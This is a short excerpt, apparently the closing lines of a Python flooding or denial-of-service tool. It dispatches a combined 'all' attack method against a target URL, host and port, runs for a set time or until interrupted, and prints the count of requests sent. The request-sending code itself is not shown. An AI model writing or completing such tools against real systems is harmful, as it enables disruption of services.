    elif method_key == "all":
        all_methods_combined(target_url, target_host, target_port)
    
    if duration > 0:
        time.sleep(duration)
        stop_attack.set()
    else:
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            stop_attack.set()
    
    print(f"\n\n{Fore.YELLOW}[+] Attack finished. Total requests: {stats['requests_sent']:,}{Style.RESET_ALL}")

if __name__ == "__main__":
    main()